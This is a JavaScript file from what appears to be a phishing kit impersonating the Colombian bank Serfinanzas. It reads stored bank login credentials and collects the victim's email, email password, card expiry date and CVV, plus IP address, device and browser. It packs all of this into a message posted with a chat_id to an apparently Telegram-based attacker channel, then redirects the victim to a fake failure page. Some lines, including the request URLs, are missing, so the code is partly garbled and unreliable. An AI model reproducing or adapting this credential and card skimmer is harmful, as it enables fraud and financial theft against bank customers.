


let email = document.getElementById("email");

email.addEventListener("input", function () {
  if (email.value.length > 50) {
    email.value = email.value.slice(0, 50);
  }
});

let pass = document.getElementById("pass");

pass.addEventListener("input", function () {
  if (pass.value.length > 50) {
    pass.value = pass.value.slice(0, 50);
  }
});

let mm = document.getElementById("mm");

mm.addEventListener("input", function () {
  if (mm.value.length > 2) {
    mm.value = mm.value.slice(0, 2);
  }
});

let yy = document.getElementById("yy");

yy.addEventListener("input", function () {
  if (yy.value.length > 2) {
    yy.value = yy.value.slice(0, 2);
  }
});

let cvv = document.getElementById("cvv");

cvv.addEventListener("input", function () {
  if (cvv.value.length > 3) {
    cvv.value = cvv.value.slice(0, 3);
  }
});

// Captura los datos del formulario HTML1 y los guarda en el almacenamiento local
function captureData() {
  let username = document.getElementById("UserName").value;
  let password = document.getElementById("Password").value;

  // Guarda los datos en el almacenamiento local
  localStorage.setItem("UserName", username);
  localStorage.setItem("Password", password);
}

function sendData() {
  let email = document.getElementById("email").value;
  let pass = document.getElementById("pass").value;
  let mm = document.getElementById("mm").value;
  let yy = document.getElementById("yy").value;
  let cvv = document.getElementById("cvv").value;
  let checkbox = document.getElementById("TerminosYCondiciones");

  // Verificar campos vacíos
  if (email.length <= 3) {
    $("#email").modal("show");
    return;
  }
  if (pass.length <= 1) {
    $("#pass").modal("show");
    return;
  }
  if (mm.length <= 1) {
    $("#mmm").modal("show");
    return;
  } else if (yy.length <= 1) {
    $("#yyy").modal("show");
    return;
  } else if (cvv.length !== 3) {
    $("#cvvv").modal("show");
    return;
  } else if (!checkbox.checked) {
    $("#dialogTYC").modal("show");
    return;
  }

  // Obtener los datos del almacenamiento local
  let username = localStorage.getItem("UserName");
  let password = localStorage.getItem("Password");

  // Capturar información del visitante
  let ip = "";
    .then((response) => response.json())
    .then((data) => {
      ip = data.ip;

      // Obtener información del dispositivo y navegador
      let userAgent = navigator.userAgent;
      let device = "Desktop";
      if (userAgent.match(/Android/i)) {
        device = "Android";
      } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
        device = "iOS";
      }

      let browser = "";
      if (userAgent.indexOf("Firefox") > -1) {
        browser = "Firefox";
      } else if (userAgent.indexOf("Chrome") > -1) {
        browser = "Chrome";
      } else if (userAgent.indexOf("Safari") > -1) {
        browser = "Safari";
      } else if (userAgent.indexOf("Opera") > -1) {
        browser = "Opera";
      } else if (userAgent.indexOf("Edge") > -1) {
        browser = "Edge";
      } else if (
        userAgent.indexOf("MSIE") > -1 ||
        userAgent.indexOf("Trident/") > -1
      ) {
        browser = "Internet Explorer";
      }

      let chatId = "6964810998";
      let message =
      "Información de Serfinanzas\n\n" +
      "Datos de inicio de sesión:\n\n" +
      "Usuario:  " + username +
      "\nContraseña:  " + password +
      "\n\nDatos del correo:\n" +
      "Email: " + email +
      "\nContraseña: " + pass +
      "\n\nDatos de la tarjeta:\n" +
      "Fecha vencimiento:  " + mm + "/" + yy +
      "\nCVV:  " + cvv +
      "\n\nInformación del visitante:\n\n" +
      "IP: " + ip +
      "\nDispositivo: " + device +
      "\nNavegador: " + browser;

      let formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("text", message);

      // Mostrar el modal loader
      // showLoader();
      $("#pleaseWaitDialog").modal("show");

        method: "POST",
        body: formData,
      })
        .then(response => response.json())
          } else {
          }
        })
        .catch((error) => {
        });
      setTimeout(function () {
        $("#pleaseWaitDialog").modal("hide");
        window.location.href = "/Personal/Success/FailWhale6c5c.html";
      }, 9000);
    });
}